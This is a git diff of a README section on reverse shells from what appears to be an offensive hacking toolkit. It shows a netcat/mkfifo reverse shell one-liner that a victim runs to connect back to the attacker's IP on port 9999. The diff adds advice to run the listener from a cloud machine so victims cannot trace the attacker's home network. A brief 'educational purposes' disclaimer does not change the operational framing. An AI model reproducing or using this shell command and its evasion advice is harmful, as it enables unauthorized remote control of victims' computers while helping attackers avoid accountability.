@@ -36,13 +36,17 @@ simple phone number locator
            
 # Reverse shells 
  
-To use the listener change the ip in listener.py and run it to start listening
+To use the listener change the ip in net.py and run it to start listening
 
+Makesure you add your ip to the victim's command.
 
-Then send the run.py file to your victim.
+* Guidlines 
 
+> Always use a cloud linux machine or another os in the cloud, because when the victim type the command he can grab your home network ip.
+
+> And this tool is only for educational purposes.
 
     kali@attacker ~ $ python3 listen.py
-    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f  
+    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <add your ip> 9999 >/tmp/f  
            
-made by Treveen
+Made with 💖 by THB
